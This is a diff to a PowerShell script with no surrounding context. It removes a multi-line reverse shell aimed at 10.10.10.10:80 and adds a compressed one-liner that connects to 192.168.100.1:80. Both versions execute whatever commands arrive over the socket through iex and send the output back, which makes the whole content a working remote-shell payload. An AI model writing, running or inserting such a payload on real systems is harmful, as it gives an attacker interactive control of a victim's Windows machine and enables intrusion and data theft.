@@ -1,14 +1,1 @@
-$ip="10.10.10.10";
-$port=80;
-$client = New-Object System.Net.Sockets.TCPClient($ip,$port);
-$stream = $client.GetStream();
-$number = 65535;
-$zero =0;
-[byte[]]$bytes = $zero..$number|%{$zero};
-while(($i = $stream.Read($bytes, $zero, $bytes.Length)) -ne $zero){;
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,$zero, $i);
-$sendback = (iex $data 2>&1 | Out-String );
-$sendback2  = $sendback + "RP " + "# ";
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,$zero,$sendbyte.Length);
-$stream.Flush()};$client.Close()
+$sm=(New-Object Net.Sockets.TCPClient('192.168.100.1',80)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
